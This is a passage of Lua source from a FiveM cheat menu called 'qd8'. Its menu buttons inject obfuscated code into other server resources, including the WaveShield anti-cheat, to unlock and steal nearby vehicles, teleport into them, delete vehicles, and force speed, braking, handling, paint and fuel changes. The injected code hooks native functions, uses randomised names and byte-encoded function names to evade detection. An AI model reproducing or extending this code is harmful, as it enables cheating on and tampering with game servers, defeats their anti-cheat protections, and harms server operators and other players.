                                    RfDsHuNjMaLpOyBt(jwErTyUiOpMzNaLk, 0)
                                    AqWsEdRzXcVtBnMa(jwErTyUiOpMzNaLk, 7)

                                    for XyZoPqRtWnEsDfGh = 0, 16 do
                                        local uYtReWqAzXsDcVf = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh)
                                        if uYtReWqAzXsDcVf and uYtReWqAzXsDcVf > 0 then
                                            QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh, uYtReWqAzXsDcVf - 1, false)
                                        end
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 14, 16, false)

                                    local aSxDcFgHiJuKoLpM = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, 15)
                                    if aSxDcFgHiJuKoLpM and aSxDcFgHiJuKoLpM > 1 then
                                        QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 15, aSxDcFgHiJuKoLpM - 2, false)
                                    end

                                    for QeTrBnMkOjHuYgFv = 17, 22 do
                                        ZxCvBnMqWeRtYuIo(jwErTyUiOpMzNaLk, QeTrBnMkOjHuYgFv, true)
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 23, 1, false)
                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 24, 1, false)

                                    for TpYuIoPlMnBvCxZq = 1, 12 do
                                        if RvTgYhNuMjIkLoPb(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq) then
                                            UjMiKoLpNwAzSdFg(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq, false)
                                        end
                                    end

                                    MnBvCxZaSdFgHjKl(jwErTyUiOpMzNaLk, 1)
                                    LkJhGfDsQaZwXeCr(jwErTyUiOpMzNaLk, false)
                                end

                                XzPmLqRnWyBtVkGhQe()
                            ]])
                            end
                        end
                        },
                        { type = "button", label = "Delete Vehicle",
                            onSelect = function()
                            qd8:Notify("success", "qd8", "Deleted Vehicle", 3000)
                            MachoInjectResourceRaw("any", [[
                            local function LXpTqWvR80()
                                local aQw = PlayerPedId
                                local bEr = GetVehiclePedIsIn
                                local cTy = DoesEntityExist
                                local dUi = NetworkHasControlOfEntity
                                local eOp = SetEntityAsMissionEntity
                                local fAs = DeleteEntity
                                local gDf = DeleteVehicle
                                local hJk = SetVehicleHasBeenOwnedByPlayer

                                local ped = aQw()
                                local veh = bEr(ped, false)

                                if veh and veh ~= 0 and cTy(veh) then
                                    hJk(veh, true)
                                    eOp(veh, true, true)

                                    if dUi(veh) then
                                        fAs(veh)
                                        gDf(veh)
                                    end
                                end

                            end

                            LXpTqWvR80()
                            ]])
                            end
                        },
                        { type = "button", label = "Unlock Closest Vehicle",
                            onSelect = function()
                            qd8:Notify("success", "qd8", "Deleted Vehicle", 3000)
                            MachoInjectResourceRaw("any", [[
                            local function TpLMqKtXwZ()
                                local AsoYuTrBnMvCxZaQw = PlayerPedId
                                local GhrTnLpKjUyVbMnZx = GetEntityCoords
                                local UyeWsDcXzQvBnMaLp = GetClosestVehicle
                                local ZmkLpQwErTyUiOpAs = DoesEntityExist
                                local VczNmLoJhBgVfCdEx = SetEntityAsMissionEntity
                                local EqWoXyBkVsNzQuH = SetVehicleDoorsLocked
                                local YxZwQvTrBnMaSdFgHj = SetVehicleDoorsLockedForAllPlayers
                                local RtYuIoPlMnBvCxZaSd = SetVehicleHasBeenOwnedByPlayer
                                local LkJhGfDsAzXwCeVrBt = NetworkHasControlOfEntity

                                local ped = AsoYuTrBnMvCxZaQw()
                                local coords = GhrTnLpKjUyVbMnZx(ped)
                                local veh = UyeWsDcXzQvBnMaLp(coords.x, coords.y, coords.z, 10.0, 0, 70)

                                if veh and ZmkLpQwErTyUiOpAs(veh) and LkJhGfDsAzXwCeVrBt(veh) then
                                    VczNmLoJhBgVfCdEx(veh, true, true)
                                    RtYuIoPlMnBvCxZaSd(veh, true)
                                    EqWoXyBkVsNzQuH(veh, 1)
                                    YxZwQvTrBnMaSdFgHj(veh, false)
                                end

                            end

                            TpLMqKtXwZ()
                            ]])
                            end
                        },
                        { type = "button", label = "Teleport into Closest Vehicle",
                            onSelect = function()
                            qd8:Notify("success", "qd8", "Teleported into Vehicle", 3000)
                            MachoInjectResourceRaw(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end

                                _G[nativeName] = function(...)
                                    return newFunction(originalNative, ...)
                                end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetClosestVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetVehicleForwardSpeed", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                            local function uPKcoBaEHmnK()
                                local ziCFzHyzxaLX = SetPedIntoVehicle
                                local YPPvDlOGBghA = GetClosestVehicle

                                local Coords = GetEntityCoords(PlayerPedId())
                                local vehicle = YPPvDlOGBghA(Coords.x, Coords.y, Coords.z, 15.0, 0, 70)

                                if DoesEntityExist(vehicle) and not IsPedInAnyVehicle(PlayerPedId(), false) then
                                    if GetPedInVehicleSeat(vehicle, -1) == 0 then
                                        ziCFzHyzxaLX(PlayerPedId(), vehicle, -1)
                                    else
                                        ziCFzHyzxaLX(PlayerPedId(), vehicle, 0)
                                    end
                                end
                            end

                            uPKcoBaEHmnK()
                            ]])
                            end
                        },
                        { type = "divider", label = "Toggles" },
                        {
                            type = "checkbox",
                            label = "Boost Vehicle",
                            checked = false,
                            onSelect = function(checked)
                                if checked then
                                    qd8:Notify("success", "qd8", "Boost Vehicle On", 3000)

                                    if GetResourceState("WaveShield") == "started" then
                                        Injection(GetResourceState("WaveShield") == "started" and "WaveShield" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            if not _G.superSpeedBoost then
                                                _G.superSpeedBoost = true

                                                local PlayerPedId_fn       = g({80,108,97,121,101,114,80,101,100,73,100})
                                                local GetVehiclePedIsIn_fn = g({71,101,116,86,101,104,105,99,108,101,80,101,100,73,115,73,110})
                                                local IsPedInAnyVehicle_fn = g({73,115,80,101,100,73,110,65,110,121,86,101,104,105,99,108,101})
                                                local IsControlPressed_fn  = g({73,115,67,111,110,116,114,111,108,80,114,101,115,115,101,100})
                                                local SetVehicleForwardSpeed_fn = g({83,101,116,86,101,104,105,99,108,101,70,111,114,119,97,114,100,83,112,101,101,100})
                                                local Wait_fn              = g({87,97,105,116})

                                                _G.superSpeedBoostEnabled = true

                                                local function initFlow(cb)
                                                    local co = coroutine.create(cb)
                                                    local function execCycle()
                                                        while coroutine.status(co) ~= "dead" do
                                                            local ok, err = coroutine.resume(co)
                                                            if not ok then
                                                                print("^1[SuperSpeedBoost] Coroutine error: ^7", err)
                                                                break
                                                            end
                                                            Wait_fn(0)
                                                        end
                                                    end
                                                    execCycle()
                                                end

                                                initFlow(function()
                                                    while _G.superSpeedBoostEnabled do
                                                        if not _G.superSpeedBoostEnabled then break end

                                                        local ped = PlayerPedId_fn()
                                                        if IsControlPressed_fn(0, 209) and IsPedInAnyVehicle_fn(ped, false) then
                                                            local veh = GetVehiclePedIsIn_fn(ped, false)
                                                            if veh and veh ~= 0 then
                                                                SetVehicleForwardSpeed_fn(veh, 100.0)
                                                            end
                                                        end

                                                        Wait_fn(0)
                                                    end
                                                end)
                                            end
                                        ]])
                                    else
                                        MachoInjectResourceRaw("any", [[
                                            if VkLpOiUyTrEq == nil then VkLpOiUyTrEq = false end
                                            if VbNmQwErTyUi == nil then
                                                VbNmQwErTyUi = true

                                                local function YgT7FrqXcN()
                                                    local ZxSeRtYhUiOp = CreateThread
                                                    local LkJhGfDsAzXv = PlayerPedId
                                                    local PoLkJhBgVfCd = GetVehiclePedIsIn
                                                    local ErTyUiOpAsDf = IsControlPressed
                                                    local GtHyJuKoLpMi = IsPedInAnyVehicle
                                                    local HnJmKlIoPuYt = SetVehicleForwardSpeed

                                                    ZxSeRtYhUiOp(function()
                                                        while true do
                                                            Wait(0)
                                                            if not VkLpOiUyTrEq then
                                                                Wait(500)
                                                                goto continue
                                                            end

                                                            local ped = LkJhGfDsAzXv()
                                                            if ErTyUiOpAsDf(0, 209) and GtHyJuKoLpMi(ped, false) then
                                                                local veh = PoLkJhBgVfCd(ped, false)
                                                                if veh and veh ~= 0 then
                                                                    HnJmKlIoPuYt(veh, 100.0)
                                                                end
                                                            end

                                                            ::continue::
                                                        end
                                                    end)
                                                end

                                                YgT7FrqXcN()
                                            end
                                            
                                            VkLpOiUyTrEq = true
                                        ]])
                                    end
                                else
                                    qd8:Notify("error", "qd8", "Boost Vehicle Off", 3000)

                                    if GetResourceState("WaveShield") == "started" then
                                        Injection(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
                                            _G.superSpeedBoost = false
                                        ]])
                                    else
                                        Injection("any", [[
                                            VkLpOiUyTrEq = false
                                        ]])
                                    end
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Instant Brakes",
                            checked = false,
                            onSelect = function(checked)
                                local waveStarted = GetResourceState("WaveShield") == 'started'
                                local targetRes = (GetResourceState("monitor") == "started" and "monitor")
                                    or (GetResourceState("ox_lib") == "started" and "ox_lib")
                                    or "any"

                                if checked then
                                    if waveStarted then
                                        qd8:Notify("success", "qd8", "Instant Brakes On", 3000)
                                        Injection(GetResourceState("lb-phone") == "started" and "lb-phone" or GetResourceState("WaveShield") == "started" and "WaveShield" or "any", [[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            if VkLpOiUyTrEq == nil then VkLpOiUyTrEq = false end
                                            VkLpOiUyTrEq = true

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local ok, err
                                                while coroutine.status(co) ~= "dead" do
                                                    ok, err = coroutine.resume(co)
                                                    if not ok then
                                                        print("WaveShield Coroutine error:", err)
                                                        break
                                                    end
                                                    Citizen.Wait(0)
                                                end
                                            end

                                            initFlow(function()
                                                local function getPed() return PlayerPedId() end
                                                local PoLkJhBgVfCd = GetVehiclePedIsIn
                                                local ErTyUiOpAsDf = IsDisabledControlPressed
                                                local GtHyJuKoLpMi = IsPedInAnyVehicle
                                                local VbNmQwErTyUi = SetVehicleForwardSpeed

                                                while VkLpOiUyTrEq and not Unloaded do
                                                    Wait(0)
                                                    local ped = getPed()
                                                    if not ped or ped == 0 then goto continue end
                                                    local veh = PoLkJhBgVfCd(ped, false)
                                                    if veh and veh ~= 0 then
                                                        if ErTyUiOpAsDf(0, 33) and GtHyJuKoLpMi(ped, false) then
                                                            VbNmQwErTyUi(veh, 0.0)
                                                        end
                                                    end
                                                    ::continue::
                                                end

                                                -- Restore on disable
                                                local ped = getPed()
                                                if ped and ped ~= 0 then
                                                    local veh = PoLkJhBgVfCd(ped, false)
                                                    if veh and veh ~= 0 then
                                                        -- No need to restore speed, just stop forcing 0
                                                    end
                                                end
                                            end)
                                        ]])
                                    else
                                        Injection(targetRes, [[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetVehicleForwardSpeed", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsDisabledControlPressed", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                            if VkLpOiUyTrEq == nil then VkLpOiUyTrEq = false end
                                            VkLpOiUyTrEq = true

                                            local function YgT7FrqXcN()
                                                local ZxSeRtYhUiOp = CreateThread
                                                local LkJhGfDsAzXv = PlayerPedId
                                                local PoLkJhBgVfCd = GetVehiclePedIsIn
                                                local ErTyUiOpAsDf = IsDisabledControlPressed
                                                local GtHyJuKoLpMi = IsPedInAnyVehicle
                                                local VbNmQwErTyUi = SetVehicleForwardSpeed

                                                ZxSeRtYhUiOp(function()
                                                    while VkLpOiUyTrEq and not Unloaded do
                                                        local ped = LkJhGfDsAzXv()
                                                        local veh = PoLkJhBgVfCd(ped, false)
                                                        if veh and veh ~= 0 then
                                                            if ErTyUiOpAsDf(0, 33) and GtHyJuKoLpMi(ped, false) then
                                                                VbNmQwErTyUi(veh, 0.0)
                                                            end
                                                        end
                                                        Wait(0)
                                                    end
                                                end)
                                            end
                                            YgT7FrqXcN()
                                        ]])
                                        qd8:Notify("success", "qd8", "Instant Brakes On (Fallback)", 3000)
                                    end
                                else
                                    if waveStarted then
                                        qd8:Notify("success", "qd8", "Instant Brakes Off", 3000)
                                        Injection(GetResourceState("lb-phone") == "started" and "lb-phone" or GetResourceState("WaveShield") == "started" and "WaveShield" or "any", [[
                                            VkLpOiUyTrEq = false
                                        ]])
                                    else
                                        Injection(targetRes, [[
                                            VkLpOiUyTrEq = false
                                        ]])
                                        qd8:Notify("success", "qd8", "Instant Brakes Off (Fallback)", 3000)
                                    end
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Easy Handling",
                            checked = false,
                            onSelect = function(checked)
                                local waveStarted = GetResourceState("WaveShield") == 'started'
                                local targetRes = (GetResourceState("monitor") == "started" and "monitor")
                                            or (GetResourceState("ox_lib") == "started" and "ox_lib")
                                            or "any"

                                if checked then
                                    if waveStarted then
                                        qd8:Notify("success", "qd8", "Easy Handling On", 3000)
                                        MachoInjectResourceRaw("WaveShield", [[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            if NvGhJkLpOiUy == nil then NvGhJkLpOiUy = false end
                                            NvGhJkLpOiUy = true

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local ok, err
                                                while coroutine.status(co) ~= "dead" do
                                                    ok, err = coroutine.resume(co)
                                                    if not ok then
                                                        print("WaveShield Coroutine error:", err)
                                                        break
                                                    end
                                                    Citizen.Wait(0)
                                                end
                                            end

                                            initFlow(function()
                                                local function getPed() return GetPlayerPed(-1) end
                                                local TyUiOpAsDfGh = GetVehiclePedIsIn
                                                local UyTrBnMvCxZl = SetVehicleGravityAmount
                                                local PlMnBvCxZaSd = SetVehicleStrong

                                                while NvGhJkLpOiUy and not Unloaded do
                                                    Wait(0)
                                                    local ped = getPed()
                                                    if not ped or ped == 0 then goto continue end
                                                    local veh = TyUiOpAsDfGh(ped, false)
                                                    if veh and veh ~= 0 then
                                                        UyTrBnMvCxZl(veh, 73.0)
                                                        PlMnBvCxZaSd(veh, true)
                                                    end
                                                    ::continue::
                                                end

                                                local ped = getPed()
                                                if ped and ped ~= 0 then
                                                    local veh = TyUiOpAsDfGh(ped, false)
                                                    if veh and veh ~= 0 then
                                                        UyTrBnMvCxZl(veh, 9.8)
                                                        PlMnBvCxZaSd(veh, false)
                                                    end
                                                end
                                            end)
                                        ]])
                                    else
                                        Injection(targetRes, [[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetVehicleGravityAmount", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetVehicleStrong", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                            if NvGhJkLpOiUy == nil then NvGhJkLpOiUy = false end
                                            NvGhJkLpOiUy = true

                                            local function KbZwVoYtLx()
                                                local BtGhYtUlOpLk = CreateThread
                                                local WeRtYuIoPlMn = PlayerPedId
                                                local TyUiOpAsDfGh = GetVehiclePedIsIn
                                                local UyTrBnMvCxZl = SetVehicleGravityAmount
                                                local PlMnBvCxZaSd = SetVehicleStrong

                                                BtGhYtUlOpLk(function()
                                                    while NvGhJkLpOiUy and not Unloaded do
                                                        local ped = WeRtYuIoPlMn()
                                                        local veh = TyUiOpAsDfGh(ped, false)
                                                        if veh and veh ~= 0 then
                                                            UyTrBnMvCxZl(veh, 73.0)
                                                            PlMnBvCxZaSd(veh, true)
                                                        end
                                                        Wait(0)
                                                    end

                                                    -- Restore
                                                    local ped = WeRtYuIoPlMn()
                                                    local veh = TyUiOpAsDfGh(ped, false)
                                                    if veh and veh ~= 0 then
                                                        UyTrBnMvCxZl(veh, 9.8)
                                                        PlMnBvCxZaSd(veh, false)
                                                    end
                                                end)
                                            end

                                            KbZwVoYtLx()
                                        ]])
                                        qd8:Notify("success", "qd8", "Easy Handling On (Fallback)", 3000)
                                    end
                                else
                                    if waveStarted then
                                        qd8:Notify("success", "qd8", "Easy Handling Off", 3000)
                                        MachoInjectResourceRaw("WaveShield", [[
                                            NvGhJkLpOiUy = false
                                            local UyTrBnMvCxZl = SetVehicleGravityAmount
                                            local PlMnBvCxZaSd = SetVehicleStrong
                                            local ped = PlayerPedId()
                                            local veh = GetVehiclePedIsIn(ped, false)
                                            if veh and veh ~= 0 then
                                                UyTrBnMvCxZl(veh, 9.8)
                                                PlMnBvCxZaSd(veh, false)
                                            end
                                        ]])
                                    else
                                        Injection(targetRes, [[
                                            NvGhJkLpOiUy = false
                                            local UyTrBnMvCxZl = SetVehicleGravityAmount
                                            local PlMnBvCxZaSd = SetVehicleStrong
                                            local ped = PlayerPedId()
                                            local veh = GetVehiclePedIsIn(ped, false)
                                            if veh and veh ~= 0 then
                                                UyTrBnMvCxZl(veh, 9.8)
                                                PlMnBvCxZaSd(veh, false)
                                            end
                                        ]])
                                        qd8:Notify("success", "qd8", "Easy Handling Off (Fallback)", 3000)
                                    end
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Rainbow Vehicle",
                            checked = false,
                            onSelect = function(checked)
                                local target = GetResourceState("monitor") == "started" and "monitor"
                                            or GetResourceState("ox_lib") == "started" and "ox_lib"
                                            or "any"
                                if checked then
                                    qd8:Notify("success", "qd8", "Rainbow Vehicle On", 3000)

                                    if GetResourceState("WaveShield") == "started" then
                                        print("souygdfg")
                                        Injection(target, [[
                                            if not _G.qd8Rainbow then
                                                _G.qd8Rainbow = { enabled = false, originals = {}, thread = nil }
                                            end
                                            _G.qd8Rainbow.enabled = true

                                            local function hNative(name, wrapper)
                                                local orig = _G[name]
                                                if not orig or type(orig) ~= "function" then return end
                                                if not _G.qd8Rainbow.originals[name] then
                                                    _G.qd8Rainbow.originals[name] = orig
                                                end
                                                _G[name] = function(...) return wrapper(orig, ...) end
                                            end

                                            hNative("Wait",                     function(o, ms) return o(ms) end)
                                            hNative("GetGameTimer",             function(o)    return o() end)
                                            hNative("math.floor",               function(o, x) return o(x) end)
                                            hNative("math.sin",                 function(o, x) return o(x) end)
                                            hNative("GetVehiclePedIsIn",        function(o, p, l) return o(p, l) end)
                                            hNative("DoesEntityExist",          function(o, e) return o(e) end)
                                            hNative("SetVehicleCustomPrimaryColour",   function(o, v, r, g, b) return o(v, r, g, b) end)
                                            hNative("SetVehicleCustomSecondaryColour", function(o, v, r, g, b) return o(v, r, g, b) end)
                                            hNative("PlayerPedId",              function(o)    return o() end)

                                            if not _G.qd8Rainbow.thread then
                                                _G.qd8Rainbow.thread = coroutine.create(function()
                                                    local freq = 1.0
                                                    local function getRainbowColor()
                                                        local t = GetGameTimer() / 1000
                                                        local r = math.floor(math.sin(t * freq + 0) * 127 + 128)
                                                        local g = math.floor(math.sin(t * freq + 2) * 127 + 128)
                                                        local b = math.floor(math.sin(t * freq + 4) * 127 + 128)
                                                        return r, g, b
                                                    end
                                                    while _G.qd8Rainbow.enabled do
                                                        local ped = PlayerPedId()
                                                        local veh = GetVehiclePedIsIn(ped, false)
                                                        if veh and veh ~= 0 and DoesEntityExist(veh) then
                                                            local r, g, b = getRainbowColor()
                                                            SetVehicleCustomPrimaryColour(veh, r, g, b)
                                                            SetVehicleCustomSecondaryColour(veh, r, g, b)
                                                        end
                                                        Wait(0)
                                                    end
                                                end)

                                                while _G.qd8Rainbow.enabled and coroutine.status(_G.qd8Rainbow.thread) ~= "dead" do
                                                    coroutine.resume(_G.qd8Rainbow.thread)
                                                    Citizen.Wait(0)
                                                end
                                            end
                                        ]])
                                    else
                                        Injection(target, [[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(o, ...) return o(...) end)
                                            hNative("Wait",         function(o, ...) return o(...) end)
                                            hNative("GetGameTimer", function(o, ...) return o(...) end)
                                            hNative("math.floor",   function(o, ...) return o(...) end)
                                            hNative("math.sin",     function(o, ...) return o(...) end)
                                            hNative("GetVehiclePedIsIn", function(o, ...) return o(...) end)
                                            hNative("DoesEntityExist",   function(o, ...) return o(...) end)
                                            hNative("SetVehicleCustomSecondaryColour", function(o, ...) return o(...) end)
                                            hNative("SetVehicleCustomPrimaryColour",   function(o, ...) return o(...) end)
                                            hNative("PlayerPedId", function(o, ...) return o(...) end)

                                            if GxRpVuNzYiTq == nil then GxRpVuNzYiTq = false end
                                            GxRpVuNzYiTq = true

                                            local function jqX7TvYzWq()
                                                local WvBnMpLsQzTx = GetGameTimer
                                                local VcZoPwLsEkRn = math.floor
                                                local DfHkLtQwAzCx = math.sin
                                                local PlJoQwErTgYs = CreateThread
                                                local MzLxVoKsUyNz = GetVehiclePedIsIn
                                                local EyUiNkOpLtRg = PlayerPedId
                                                local KxFwEmTrZpYq = DoesEntityExist
                                                local UfBnDxCrQeTg = SetVehicleCustomPrimaryColour
                                                local BvNzMxLoPwEq = SetVehicleCustomSecondaryColour
                                                local yGfTzLkRn = 1.0

                                                local function HrCvWbXuNz(freq)
                                                    local color = {}
                                                    local t = WvBnMpLsQzTx() / 1000
                                                    color.r = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 0) * 127 + 128)
                                                    color.g = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 2) * 127 + 128)
                                                    color.b = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 4) * 127 + 128)
                                                    return color
                                                end

                                                PlJoQwErTgYs(function()
                                                    while GxRpVuNzYiTq and not Unloaded do
                                                        local ped = EyUiNkOpLtRg()
                                                        local veh = MzLxVoKsUyNz(ped, false)
                                                        if veh and veh ~= 0 and KxFwEmTrZpYq(veh) then
                                                            local rgb = HrCvWbXuNz(yGfTzLkRn)
                                                            UfBnDxCrQeTg(veh, rgb.r, rgb.g, rgb.b)
                                                            BvNzMxLoPwEq(veh, rgb.r, rgb.g, rgb.b)
                                                        end
                                                        Wait(0)
                                                    end
                                                end)
                                            end
                                            jqX7TvYzWq()
                                        ]])
                                    end
                                else
                                    qd8:Notify("error", "qd8", "Rainbow Vehicle Off", 3000)
                                    if GetResourceState("WaveShield") == "started" then
                                        print("swave")
                                        Injection(target, [[
                                            if not _G.qd8Rainbow then
                                                _G.qd8Rainbow = { enabled = false, originals = {}, thread = nil }
                                            end
                                            _G.qd8Rainbow.enabled = false

                                            for name, orig in pairs(_G.qd8Rainbow.originals) do
                                                if _G[name] then _G[name] = orig end
                                            end

                                            if _G.qd8Rainbow.thread and coroutine.status(_G.qd8Rainbow.thread) ~= "dead" then
                                                coroutine.resume(_G.qd8Rainbow.thread)
                                            end

                                            local co = coroutine.create(function()
                                                local ped = PlayerPedId()
                                                local veh = GetVehiclePedIsIn(ped, false)
                                                if veh and veh ~= 0 and DoesEntityExist(veh) then
                                                    SetVehicleCustomPrimaryColour(veh, 255, 255, 255)
                                                    SetVehicleCustomSecondaryColour(veh, 255, 255, 255)
                                                end
                                            end)
                                            while coroutine.status(co) ~= "dead" do
                                                coroutine.resume(co)
                                                Citizen.Wait(0)
                                            end
                                        ]])
                                    else
                                        Injection(target, [[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(o, ...) return o(...) end)
                                            hNative("Wait",         function(o, ...) return o(...) end)
                                            hNative("GetGameTimer", function(o, ...) return o(...) end)
                                            hNative("math.floor",   function(o, ...) return o(...) end)
                                            hNative("math.sin",     function(o, ...) return o(...) end)
                                            hNative("GetVehiclePedIsIn", function(o, ...) return o(...) end)
                                            hNative("DoesEntityExist",   function(o, ...) return o(...) end)
                                            hNative("SetVehicleCustomSecondaryColour", function(o, ...) return o(...) end)
                                            hNative("SetVehicleCustomPrimaryColour",   function(o, ...) return o(...) end)
                                            hNative("PlayerPedId", function(o, ...) return o(...) end)

                                            GxRpVuNzYiTq = false
                                        ]])
                                    end
                                end
                            end,
                        },
                        { type = "checkbox", label = "Unlimited Fuel", checked = false,
                            onSelect = function(checked)
                                if checked then
                                qd8:Notify("success", "qd8", "Unlimited Fuel On", 3000)
                                Injection(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleFuelLevel", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                if BlNkJmLzXcVb == nil then BlNkJmLzXcVb = false end
                                BlNkJmLzXcVb = true

                                local function LqWyXpR3tV()
                                    local TmPlKoMiJnBg = CreateThread
                                    local ZxCvBnMaSdFg = PlayerPedId
                                    local YhUjIkOlPlMn = IsPedInAnyVehicle
                                    local VcXzQwErTyUi = GetVehiclePedIsIn
                                    local KpLoMkNjBhGt = DoesEntityExist
                                    local JkLzXcVbNmAs = SetVehicleFuelLevel

                                    TmPlKoMiJnBg(function()
                                        while BlNkJmLzXcVb and not Unloaded do
                                            local ped = ZxCvBnMaSdFg()
                                            if YhUjIkOlPlMn(ped, false) then
                                                local veh = VcXzQwErTyUi(ped, false)
                                                if KpLoMkNjBhGt(veh) then
                                                    JkLzXcVbNmAs(veh, 100.0)
                                                end
                                            end
                                            Wait(100)
                                        end
                                    end)
                                end

                                LqWyXpR3tV()
                                ]])
                                else
                                qd8:Notify("error", "qd8", "Unlimited Fuel Off", 3000)
                                Injection(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleFuelLevel", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                BlNkJmLzXcVb = false
                                ]])
                                end
                            end
                        },
                    }
                },
            }
        },
        {
            icon = "",
            label = "Emotes",
            type = "subMenu",
            categories = {
                {
                    label = "Emote Menu",
                    tabs = {
                        { type = "button", label = "Detach All Entitys",
                            onSelect = function()
                                print("dih")
                            MachoInjectResourceRaw("any", [[
                            local function zXqLJWt7pN()
                                local xPvA71LtqzW = ClearPedTasks
                                local bXcT2mpqR9f = DetachEntity

                                xPvA71LtqzW(PlayerPedId())
                                bXcT2mpqR9f(PlayerPedId())
                            end

                            zXqLJWt7pN()
                            ]])
                            end
                        },
                        { type = "divider", label = "Emotes" },
                        {
                            type = "button",
                            label = "Twerk On Them",
                            onSelect = function()
                                local targetPlayers = {}
